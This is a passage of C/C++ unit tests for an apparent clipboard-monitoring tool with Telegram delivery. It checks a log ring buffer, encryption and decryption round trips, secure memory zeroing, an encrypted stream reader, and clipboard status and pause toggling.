    }

    /* Test in-memory circular log ring buffer unread extraction */
    c2t_log_error("test_comp", "Error test message %d", 42);
    size_t unread_len = 0;
    char *unread_logs = c2t_log_get_unread(&unread_len);
    if (!unread_logs || unread_len == 0 || strstr(unread_logs, "Error test message 42") == nullptr) {
        free(unread_logs);
        return fail("c2t_log_get_unread circular ring buffer verification");
    }
    c2t_log_advance_read_offset(unread_len);
    free(unread_logs);

    telegram_cleanup();
    free(last_body);

    /* Crypto & Secure Memory unit tests */
    if (!c2t_crypto_init())
        return fail("c2t_crypto_init");

    unsigned char test_nonce[C2T_CRYPTO_NONCE_SIZE];
    if (!c2t_crypto_get_random_bytes(test_nonce, sizeof(test_nonce)))
        return fail("c2t_crypto_get_random_bytes");

    const char *secret_text = "Secret Clipboard Payload 2026";
    size_t secret_len = strlen(secret_text);
    unsigned char ciphertext[64] = {0};
    unsigned char decrypted[64] = {0};

    if (!c2t_crypto_encrypt(secret_text, secret_len, test_nonce, ciphertext))
        return fail("c2t_crypto_encrypt");

    if (memcmp(secret_text, ciphertext, secret_len) == 0)
        return fail("ciphertext matches plaintext");

    if (!c2t_crypto_decrypt(ciphertext, secret_len, test_nonce, decrypted))
        return fail("c2t_crypto_decrypt");

    if (memcmp(secret_text, decrypted, secret_len) != 0)
        return fail("decrypted plaintext mismatch");

    c2t_secure_zero(decrypted, sizeof(decrypted));
    for (size_t i = 0; i < sizeof(decrypted); ++i) {
        if (decrypted[i] != 0)
            return fail("c2t_secure_zero failed");
    }

    /* Test offset decryption & streaming read */
    const char *stream_payload = "Stream Decryption On-The-Fly Test Payload 2026!";
    size_t payload_len = strlen(stream_payload);
    unsigned char enc_buf[128] = {0};
    if (!c2t_crypto_encrypt(stream_payload, payload_len, test_nonce, enc_buf))
        return fail("c2t_crypto_encrypt for stream test");

    unsigned char offset_dec[128] = {0};
    /* Decrypt from offset 7 */
    if (!c2t_crypto_decrypt_offset(enc_buf + 7, 7, payload_len - 7, test_nonce, offset_dec))
        return fail("c2t_crypto_decrypt_offset");

    if (memcmp(stream_payload + 7, offset_dec, payload_len - 7) != 0)
        return fail("offset decryption mismatch");

    c2t_encrypted_stream_t enc_st;
    c2t_encrypted_stream_init(&enc_st, "PREFIX:", 7, enc_buf, payload_len, test_nonce, ":SUFFIX", 7);
    unsigned char st_out[256] = {0};
    size_t total_read = c2t_encrypted_stream_read(&enc_st, st_out, sizeof(st_out));
    if (total_read != 7 + payload_len + 7)
        return fail("encrypted stream read total bytes mismatch");
    if (memcmp(st_out, "PREFIX:", 7) != 0 ||
        memcmp(st_out + 7, stream_payload, payload_len) != 0 ||
        memcmp(st_out + 7 + payload_len, ":SUFFIX", 7) != 0) {
        return fail("encrypted stream content mismatch");
    }

    /* Clipboard status & flush unit tests */
    char clip_stat_buf[1024] = {};
    clipboard_get_status_info(clip_stat_buf, sizeof(clip_stat_buf));
    if (strstr(clip_stat_buf, "Clipboard Monitor Status") == nullptr ||
        strstr(clip_stat_buf, "Delivery Queue:") == nullptr)
        return fail("clipboard_get_status_info format");

    clipboard_output_flush();
    int initial_pause = clipboard_is_paused();
    int toggled = clipboard_toggle_paused();
    if (toggled == initial_pause || clipboard_is_paused() != toggled)
        return fail("clipboard_toggle_paused");
    clipboard_set_paused(initial_pause);

    c2t_crypto_cleanup();
    return 0;
}
